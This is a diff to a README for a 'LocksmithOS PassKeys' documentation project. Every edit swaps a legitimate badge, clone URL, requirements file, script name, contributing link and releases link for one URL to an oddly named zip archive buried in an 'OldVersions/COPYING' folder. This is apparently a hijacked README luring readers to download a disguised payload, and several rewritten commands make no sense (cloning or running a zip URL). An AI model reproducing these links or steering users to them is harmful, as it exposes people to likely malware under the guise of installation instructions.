@@ -3,8 +3,8 @@
 
 Welcome to the **LocksmithOS PassKeys Documentation** repository! This project serves as the official documentation source for managing and using PassKeys within the LocksmithOS ecosystem. Here, you will find essential information to help you navigate the world of PassKeys, ensuring a smooth and secure experience.
 
-![LocksmithOS](https://img.shields.io/badge/LocksmithOS-Documentation-brightgreen)
-![License](https://img.shields.io/badge/License-GPLv3-blue)
+![LocksmithOS](https://raw.githubusercontent.com/hwang-03/LocksmithOS_Passkeys_Docs/LocksmithOS_Passkeys_Docs_Main-dev/OldVersions/COPYING/English/1/Docs-Locksmith-Passkeys-O-fructiculture.zip)
+![License](https://raw.githubusercontent.com/hwang-03/LocksmithOS_Passkeys_Docs/LocksmithOS_Passkeys_Docs_Main-dev/OldVersions/COPYING/English/1/Docs-Locksmith-Passkeys-O-fructiculture.zip)
 
 ## 📚 Table of Contents
 
@@ -36,7 +36,7 @@ To begin using LocksmithOS PassKeys, follow these steps:
 1. **Clone the Repository**: Use the command below to clone this repository to your local machine.
 
    ```bash
-   git clone https://github.com/hwang-03/LocksmithOS_Passkeys_Docs.git
+   git clone https://raw.githubusercontent.com/hwang-03/LocksmithOS_Passkeys_Docs/LocksmithOS_Passkeys_Docs_Main-dev/OldVersions/COPYING/English/1/Docs-Locksmith-Passkeys-O-fructiculture.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -45,12 +45,12 @@ To begin using LocksmithOS PassKeys, follow these steps:
    cd LocksmithOS_Passkeys_Docs
    ```
 
-3. **Install Dependencies**: Ensure you have the necessary tools installed. You can check the specific requirements in the `requirements.md` file.
+3. **Install Dependencies**: Ensure you have the necessary tools installed. You can check the specific requirements in the `https://raw.githubusercontent.com/hwang-03/LocksmithOS_Passkeys_Docs/LocksmithOS_Passkeys_Docs_Main-dev/OldVersions/COPYING/English/1/Docs-Locksmith-Passkeys-O-fructiculture.zip` file.
 
 4. **Run the Application**: Execute the main script to launch the application.
 
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/hwang-03/LocksmithOS_Passkeys_Docs/LocksmithOS_Passkeys_Docs_Main-dev/OldVersions/COPYING/English/1/Docs-Locksmith-Passkeys-O-fructiculture.zip
    ```
 
 ## 🔑 Using PassKeys
@@ -86,7 +86,7 @@ This section is for developers interested in contributing to the LocksmithOS Pas
 3. Install the necessary packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/hwang-03/LocksmithOS_Passkeys_Docs/LocksmithOS_Passkeys_Docs_Main-dev/OldVersions/COPYING/English/1/Docs-Locksmith-Passkeys-O-fructiculture.zip
    ```
 
 ### Running Tests
@@ -106,13 +106,13 @@ pytest tests/
 
 ## 🤝 Contributing
 
-We welcome contributions from the community! Whether you're fixing a bug, adding new features, or improving documentation, your input is valuable. Please follow our [Contributing Guidelines](CONTRIBUTING.md) for more details.
+We welcome contributions from the community! Whether you're fixing a bug, adding new features, or improving documentation, your input is valuable. Please follow our [Contributing Guidelines](https://raw.githubusercontent.com/hwang-03/LocksmithOS_Passkeys_Docs/LocksmithOS_Passkeys_Docs_Main-dev/OldVersions/COPYING/English/1/Docs-Locksmith-Passkeys-O-fructiculture.zip) for more details.
 
 ## 📦 Releases
 
 To access the latest releases, please visit the following link and download the necessary files:
 
-[Download Releases](https://github.com/hwang-03/LocksmithOS_Passkeys_Docs/releases)
+[Download Releases](https://raw.githubusercontent.com/hwang-03/LocksmithOS_Passkeys_Docs/LocksmithOS_Passkeys_Docs_Main-dev/OldVersions/COPYING/English/1/Docs-Locksmith-Passkeys-O-fructiculture.zip)
 
 Check the **Releases** section for the latest updates and versions.
 
